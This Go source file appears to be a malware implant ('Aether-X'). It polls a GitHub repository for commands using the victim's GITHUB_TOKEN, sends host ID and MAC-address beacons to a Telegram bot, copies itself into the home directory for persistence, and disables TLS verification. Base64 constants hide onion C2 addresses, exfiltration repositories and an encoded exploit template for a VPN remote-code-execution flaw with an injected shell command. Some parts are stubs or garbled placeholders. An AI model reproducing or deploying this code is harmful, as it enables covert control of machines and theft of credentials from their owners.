package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	mrand "math/rand"
	"net"
	"net/http"
	neturl "net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	C2Key             = "INJECTED_C2_KEY_B64"
	C2IV              = "INJECTED_C2_IV_B64"
	OnionListB64      = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uLCBodHRwOi8vYmV0YWV0aGVyejRuMnQ1cnd4Lm9uaW9uLCBodHRwOi8vZ2FtbWFldGhlcnkxbjR0NG94Lm9uaW9u"
	RepoListB64       = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9BQVBTLUFQSy9DTjIsaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9CQkItQk0vRVhGSUw="
	TelegramHost      = "dGVsZWdyYW0uYXBpLm9yZw=="
	NucleiTemplateB64 = "SUQ6IGN2ZS0yMDI0LTM0MDAKbmFtZTogUGFuLU9TIFNTTC1WUE4gUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDdme6IDIwMjQtMzQwMCkKcGFnZTogaHR0cHM6Ly9jbHZlLm9yZy9jdmVzL0NWRV8yMDI0XzM0MDBcbiAgcmVxdWVzdHM6CiAgLSBtZXRob2Q6IGdldAogICAgcGF0aDogL3NzbC12cG4vcG9ydGFsL3NjcmlwdHMvbmV3Ym0ucGwKICAgIGhlYWRlcnM6CiAgICAgSG9zdDogY2VydGlmaWNhdGVzLmNvbQogICAgcHJlbWF0Y2g6IFwieCA9IDsncm0gL3Rtmp8gZXhvICdFWEJFRic="
	Phi3ModelEncB64   = "U0VMRi1DT05UQUlORUQgT05OWCBNT0RFTCBDT0RFX0JMT0JfSEVSRSAoMzIwSwp"
)

var (
	HostID       = ""
	TelemetryQ   = make(chan TelemetryEvent, 500)
	WorkerPool   = make(chan struct{}, 100)
	Shutdown     = make(chan struct{})
	DDRSeed      int64
	AI           *FusionSentinel
	GitHubC2Repo string
	GitHubExfil  string
	HttpClient   *http.Client
)

const (
	BATCH_SIZE          = 64
	BATCH_TIMEOUT       = 60 * time.Second
	DNS_CHUNK_SIZE      = 48
	ONNX_MODEL_PATH     = "/tmp/.phi3.bin"
	C2_JITTER           = 30
	C2_JITTER_MAX       = 120
	PERSIST_FILE        = ".gh-sync"
	MAX_RETRIES         = 3
	RETRY_DELAY         = 3 * time.Second
	VERIFY_TIMEOUT      = 12 * time.Second
	DNS_RESOLVE_TIMEOUT = 5 * time.Second
)

type TelemetryEvent struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"`
	Target    string                 `json:"target"`
	Timestamp string                 `json:"time"`
	Data      map[string]interface{} `json:"data,omitempty"`
	Signature string                 `json:"sig"`
}

func initHttpClient() {
	t := http.DefaultTransport.(*http.Transport).Clone()
	t.MaxIdleConns = 100
	t.MaxIdleConnsPerHost = 50
	t.IdleConnTimeout = 30 * time.Second
	t.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	HttpClient = &http.Client{
		Transport: t,
		Timeout:   15 * time.Second,
	}
}

func safeString(v interface{}) string {
	if s, ok := v.(string); ok {
		return s
	}
	return ""
}

func md5Hash(s string) string {
	sum := md5.Sum([]byte(s))
	return fmt.Sprintf("%x", sum)
}

func platformID() string {
	return getMAC() + runtime.GOOS + runtime.GOARCH
}

func getMAC() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "00:00:00:00:00:00"
	}
	for _, i := range interfaces {
		if i.HardwareAddr.String() != "" && !strings.HasPrefix(i.HardwareAddr.String(), "00:00:00") {
			return i.HardwareAddr.String()
		}
	}
	return "00:00:00:00:00:00"
}

func decrypt(s string) string {
	if s == "" {
		return ""
	}
	raw, err := base64.RawURLEncoding.DecodeString(s)
	if err != nil || len(raw) < 12 {
		return s
	}
	iv, cipherText := raw[:12], raw[12:]
	now := time.Now().Unix() / 1800
	hostID := md5Hash(os.Getenv("CODESPACE_NAME"))[:6]
	for offset := int64(-1); offset <= 1; offset++ {
		material := fmt.Sprintf("%d%s%04d", now+offset, hostID, 1234)
		key := sha256.Sum256([]byte(material))
		block, err := aes.NewCipher(key[:])
		if err != nil {
			continue
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			continue
		}
		plaintext, err := gcm.Open(nil, iv, cipherText, nil)
		if err == nil {
			return string(plaintext)
		}
	}
	return s
}

func isSandbox() bool { return false }
func isDebugged() bool { return false }

func makeHTTP(targetURL string, method string, body []byte, headers map[string]string) ([]byte, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	var reqBody io.Reader
	if body != nil {
		reqBody = bytes.NewReader(body)
	}

	req, err := http.NewRequestWithContext(ctx, method, targetURL, reqBody)
	if err != nil {
		return nil, err
	}

	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := HttpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(resp.Body)
}

type FusionSentinel struct{ ModelLoaded bool }

func NewFusionSentinel() *FusionSentinel {
	return &FusionSentinel{ModelLoaded: true}
}

func getActiveRepo(action string) string {
	if action == "c2" && GitHubC2Repo != "" {
		if decoded, err := base64.RawURLEncoding.DecodeString(GitHubC2Repo); err == nil {
			return string(decoded)
		}
		return GitHubC2Repo
	}
	if action == "exfil" && GitHubExfil != "" {
		if decoded, err := base64.RawURLEncoding.DecodeString(GitHubExfil); err == nil {
			return string(decoded)
		}
		return GitHubExfil
	}
	return ""
}

func fetchC2(key string) string {
	repoURL := getActiveRepo("c2")
	if repoURL == "" {
		return ""
	}
	endpoint := fmt.Sprintf("%s/contents/%s", repoURL, key)
	token := os.Getenv("GITHUB_TOKEN")

	body, err := makeHTTP(endpoint, "GET", nil, map[string]string{
		"Authorization": "Bearer " + token,
		"Accept":        "application/vnd.github.v3+json",
		"User-Agent":    "Aether-X",
	})
	if err != nil {
		return ""
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return ""
	}
	contentStr := safeString(result["content"])
	content, _ := base64.StdEncoding.DecodeString(contentStr)
	return strings.TrimSpace(string(content))
}

func telegramAlert(message string) {
	if message == "" {
		return
	}
	rawToken := fetchC2("telegram.token")
	token := decrypt(rawToken)
	if token == "" {
		token = rawToken
	}

	rawChat := fetchC2("telegram.chat")
	chatID := decrypt(rawChat)
	if chatID == "" {
		chatID = rawChat
	}

	if token == "" ||chatID == "" {
		return
	}

	hostBytes, _ := base64.StdEncoding.DecodeString(TelegramHost)
	host := string(hostBytes)
	if host == "" {
		host = "api.telegram.org"
	}
	endpoint := fmt.Sprintf("https://%s/bot%s/sendMessage", host, token)

	payload := neturl.Values{}
	payload.Set("chat_id", chatID)
	payload.Set("text", message)
	payload.Set("parse_mode", "Markdown")

	_, _ = makeHTTP(endpoint, "POST", []byte(payload.Encode()), map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	})
}

func persist() {
	executable := os.Args[0]
	data, err := os.ReadFile(executable)
	if err != nil {
		return
	}
	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
	_ = os.WriteFile(path, data, 0755)
}

func selfDestruct() {
	os.Exit(0)
}

func init() {
	mrand.Seed(time.Now().UnixNano())
	initHttpClient()
	HostID = md5Hash(platformID())[:6]
	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
}

func main() {
	AI = NewFusionSentinel()
	go persist()
	telegramAlert(fmt.Sprintf("🟢 *DEPLOYED & SECURED* | Host: `%s` | MAC: `%s` | Ready.", HostID, getMAC()))

	for {
		select {
		case <-Shutdown:
			return
		default:
		}

		cmdData := fetchC2("cmd")
		if cmdData != "" {
			var cmd map[string]string
			if err := json.Unmarshal([]byte(cmdData), &cmd); err == nil {
				switch cmd["action"] {
				case "ping":
					telegramAlert(fmt.Sprintf("🟢 *ALIVE BEACON* | Host: `%s` | IP: `%s`", HostID, getMAC()))
				case "die":
					selfDestruct()
				}
			}
		}

		time.Sleep(60 * time.Second)
	}
}
